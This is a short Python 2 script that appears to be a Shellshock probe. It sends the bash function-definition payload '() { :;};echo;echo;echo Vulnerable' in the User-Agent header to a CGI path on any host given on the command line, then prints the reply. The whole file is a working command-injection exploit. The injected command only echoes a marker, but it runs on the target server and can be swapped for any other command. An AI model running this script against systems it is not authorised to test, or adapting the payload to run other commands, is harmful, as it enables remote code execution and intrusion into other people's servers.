import httplib,urllib,sys

if (len(sys.argv)<3):
	print "Usage: %s <host> <vulnerable CGI>"% sys.argv[0]
	print "Example: %s localhost /cgi-bin/test.cgi" % sys.argv[0]
	exit(0)

conn = httplib.HTTPConnection(sys.argv[1])
payload="() { :;};echo;echo;echo Vulnerable"

headers = {"Content-type": "application/x-www-form-urlencoded",
	"User-Agent":payload }
conn.request("GET",sys.argv[2],headers=headers)
res = conn.getresponse()
print res.status, res.reason
data = res.read()
print data
